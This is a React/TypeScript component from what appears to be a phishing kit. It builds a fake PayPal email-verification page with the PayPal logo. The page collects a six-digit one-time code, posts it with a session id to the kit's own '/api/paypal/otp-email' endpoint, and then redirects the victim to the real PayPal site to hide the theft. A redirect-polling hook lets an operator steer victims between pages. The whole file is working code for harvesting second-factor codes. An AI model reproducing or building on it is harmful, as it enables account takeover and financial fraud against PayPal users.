import { useState, useEffect } from "react";
import { useMutation } from "@tanstack/react-query";
import { apiRequest } from "@/lib/queryClient";
import { Card, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { useRedirectPolling } from "@/hooks/use-redirect-polling";
import paypalLogo from "@assets/generated_images/PayPal_official_logo_d33d02f7.png";
import { useLanguage } from "@/hooks/use-language";
import { Mail } from "lucide-react";

export default function PayPalOTPEmailPage() {
  const { t } = useLanguage();
  const [otp, setOtp] = useState("");
  const [sessionId, setSessionId] = useState<string | null>(null);

  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const id = params.get("session");
    if (id) setSessionId(id);
  }, []);

  // Use redirect polling hook
  useRedirectPolling({
    sessionId,
    currentPath: "/paypal/otp-email",
    apiEndpoint: "/api/paypal/session",
    pathEndpoint: "/api/paypal/session/:sessionId/path",
  });

  const otpMutation = useMutation({
    mutationFn: async (otpValue: string) => {
      return await apiRequest("POST", "/api/paypal/otp-email", {
        sessionId,
        otp: otpValue,
      });
    },
    onSuccess: () => {
      // Redirect to official PayPal site
      window.location.href = "https://www.paypal.com";
    },
  });

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (otp.length === 6) {
      otpMutation.mutate(otp);
    }
  };

  return (
    <div className="min-h-screen bg-white flex flex-col">
      <div className="flex-1 flex items-center justify-center p-4">
        <div className="w-full max-w-md space-y-8">
          {/* PayPal Logo */}
          <div className="flex justify-center">
            <img src={paypalLogo} alt="PayPal" className="h-40 w-auto" data-testid="img-paypal-logo" />
          </div>

          <Card className="border-2">
            <CardContent className="pt-6 pb-8 px-8">
              <form onSubmit={handleSubmit} className="space-y-6">
                <div className="space-y-3 text-center">
                  <div className="flex justify-center mb-4">
                    <div className="bg-blue-50 p-4 rounded-full">
                      <Mail className="w-8 h-8 text-[#0070ba]" />
                    </div>
                  </div>
                  <h2 className="text-2xl font-semibold text-gray-900" data-testid="text-title">
                    {t("paypalEmailVerification")}
                  </h2>
                  <p className="text-gray-600" data-testid="text-description">
                    {t("paypalEnterCodeEmail")}
                  </p>
                </div>

                <div className="space-y-2">
                  <Label htmlFor="otp" className="text-gray-700">
                    {t("paypalVerificationCode")}
                  </Label>
                  <Input
                    id="otp"
                    data-testid="input-otp-email"
                    type="text"
                    inputMode="numeric"
                    pattern="[0-9]*"
                    placeholder="000000"
                    value={otp}
                    onChange={(e) => setOtp(e.target.value.replace(/\D/g, ""))}
                    maxLength={6}
                    className="h-12 text-center text-2xl tracking-widest font-mono border-2 border-border focus:border-[#0070ba]"
                    required
                  />
                </div>

                <Button
                  type="submit"
                  disabled={otp.length !== 6 || otpMutation.isPending}
                  className="w-full h-12 bg-[#0070ba] hover:bg-[#005ea6] text-white font-semibold rounded-full"
                  data-testid="button-submit-email-otp"
                >
                  {otpMutation.isPending ? t("paypalVerifying") : t("paypalVerify")}
                </Button>

                <div className="text-center">
                  <button
                    type="button"
                    className="text-sm text-[#0070ba] hover:underline"
                    data-testid="button-resend-email"
                  >
                    {t("paypalResendCode")}
                  </button>
                </div>
              </form>
            </CardContent>
          </Card>
        </div>
      </div>
    </div>
  );
}
